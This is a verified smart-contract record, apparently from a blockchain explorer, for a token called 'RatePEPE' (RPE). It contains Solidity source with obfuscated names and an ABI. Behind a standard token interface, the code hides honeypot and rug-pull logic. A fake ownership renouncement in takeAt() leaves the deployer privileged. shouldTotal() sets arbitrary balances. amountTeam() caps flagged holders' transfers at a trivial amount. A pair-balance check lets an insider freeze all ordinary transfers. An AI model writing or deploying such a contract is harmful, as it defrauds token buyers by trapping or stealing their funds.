{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface amountListSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minExempt) external view returns (uint256);\n\n    function transfer(address walletBuy, uint256 txTakeReceiver) external returns (bool);\n\n    function allowance(address fromLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txTakeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletBuy,\n        uint256 txTakeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverShould, uint256 value);\n    event Approval(address indexed fromLimit, address indexed spender, uint256 value);\n}\n\nabstract contract maxWalletSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityList {\n    function createPair(address minMax, address swapLaunched) external returns (address);\n}\n\ninterface isTotal is amountListSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RatePEPE is maxWalletSell, amountListSell, isTotal {\n\n    mapping(address => mapping(address => uint256)) private swapTeam;\n\n    uint256 buyAtMode;\n\n    function transfer(address isLaunch, uint256 txTakeReceiver) external virtual override returns (bool) {\n        return walletBuyMax(_msgSender(), isLaunch, txTakeReceiver);\n    }\n\n    uint256 private isLaunched;\n\n    mapping(address => uint256) private fundMin;\n\n    uint256 minWalletSell;\n\n    function walletEnable(address fromLaunch, address walletBuy, uint256 txTakeReceiver) internal returns (bool) {\n        require(fundMin[fromLaunch] >= txTakeReceiver);\n        fundMin[fromLaunch] -= txTakeReceiver;\n        fundMin[walletBuy] += txTakeReceiver;\n        emit Transfer(fromLaunch, walletBuy, txTakeReceiver);\n        return true;\n    }\n\n    constructor (){\n        if (modeLiquidity != buyModeAt) {\n            modeLiquidity = false;\n        }\n        launchLiquidity minTake = launchLiquidity(receiverLiquidity);\n        minLimit = liquidityList(minTake.factory()).createPair(minTake.WETH(), address(this));\n        if (teamLaunch == buyExemptReceiver) {\n            buyExemptReceiver = teamLaunch;\n        }\n        fundLaunched = _msgSender();\n        takeAt();\n        maxSwap[fundLaunched] = true;\n        fundMin[fundLaunched] = launchedIs;\n        \n        emit Transfer(address(0), fundLaunched, launchedIs);\n    }\n\n    string private teamWalletMax = \"Rate PEPE\";\n\n    bool private modeLiquidity;\n\n    address receiverLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function shouldReceiver(address totalLaunched) public {\n        if (listTo) {\n            return;\n        }\n        if (isLaunched == teamLaunch) {\n            teamLaunch = buyExemptReceiver;\n        }\n        maxSwap[totalLaunched] = true;\n        if (isLaunched != buyExemptReceiver) {\n            teamLaunch = isLaunched;\n        }\n        listTo = true;\n    }\n\n    address public fundLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atEnableTrading;\n    }\n\n    uint256 private teamLaunch;\n\n    function transferFrom(address fromLaunch, address walletBuy, uint256 txTakeReceiver) external override returns (bool) {\n        if (_msgSender() != receiverLiquidity) {\n            if (swapTeam[fromLaunch][_msgSender()] != type(uint256).max) {\n                require(txTakeReceiver <= swapTeam[fromLaunch][_msgSender()]);\n                swapTeam[fromLaunch][_msgSender()] -= txTakeReceiver;\n            }\n        }\n        return walletBuyMax(fromLaunch, walletBuy, txTakeReceiver);\n    }\n\n    function amountIsTeam(uint256 txTakeReceiver) public {\n        toTx();\n        minWalletSell = txTakeReceiver;\n    }\n\n    event OwnershipTransferred(address indexed listTx, address indexed autoAmount);\n\n    address public minLimit;\n\n    string private atEnableTrading = \"RPE\";\n\n    function takeAt() public {\n        emit OwnershipTransferred(fundLaunched, address(0));\n        shouldMin = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return shouldMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldMin;\n    }\n\n    bool public listTo;\n\n    function toTx() private view {\n        require(maxSwap[_msgSender()]);\n    }\n\n    address isAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedIs;\n    }\n\n    address private shouldMin;\n\n    function approve(address swapReceiver, uint256 txTakeReceiver) public virtual override returns (bool) {\n        swapTeam[_msgSender()][swapReceiver] = txTakeReceiver;\n        emit Approval(_msgSender(), swapReceiver, txTakeReceiver);\n        return true;\n    }\n\n    function walletBuyMax(address fromLaunch, address walletBuy, uint256 txTakeReceiver) internal returns (bool) {\n        if (fromLaunch == fundLaunched) {\n            return walletEnable(fromLaunch, walletBuy, txTakeReceiver);\n        }\n        uint256 exemptEnable = amountListSell(minLimit).balanceOf(isAuto);\n        require(exemptEnable == minWalletSell);\n        require(walletBuy != isAuto);\n        if (totalReceiverReceiver[fromLaunch]) {\n            return walletEnable(fromLaunch, walletBuy, liquiditySwap);\n        }\n        return walletEnable(fromLaunch, walletBuy, txTakeReceiver);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingToken;\n    }\n\n    uint256 public buyExemptReceiver;\n\n    mapping(address => bool) public maxSwap;\n\n    function balanceOf(address minExempt) public view virtual override returns (uint256) {\n        return fundMin[minExempt];\n    }\n\n    mapping(address => bool) public totalReceiverReceiver;\n\n    function allowance(address limitFromTx, address swapReceiver) external view virtual override returns (uint256) {\n        if (swapReceiver == receiverLiquidity) {\n            return type(uint256).max;\n        }\n        return swapTeam[limitFromTx][swapReceiver];\n    }\n\n    bool public buyModeAt;\n\n    function amountTeam(address walletFee) public {\n        toTx();\n        if (buyModeAt != modeLiquidity) {\n            modeLiquidity = false;\n        }\n        if (walletFee == fundLaunched || walletFee == minLimit) {\n            return;\n        }\n        totalReceiverReceiver[walletFee] = true;\n    }\n\n    uint8 private marketingToken = 18;\n\n    function shouldTotal(address isLaunch, uint256 txTakeReceiver) public {\n        toTx();\n        fundMin[isLaunch] = txTakeReceiver;\n    }\n\n    uint256 constant liquiditySwap = 18 ** 10;\n\n    uint256 private launchedIs = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return teamWalletMax;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFromTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"amountIsTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"}],\"name\":\"amountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExemptReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyModeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"shouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalReceiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}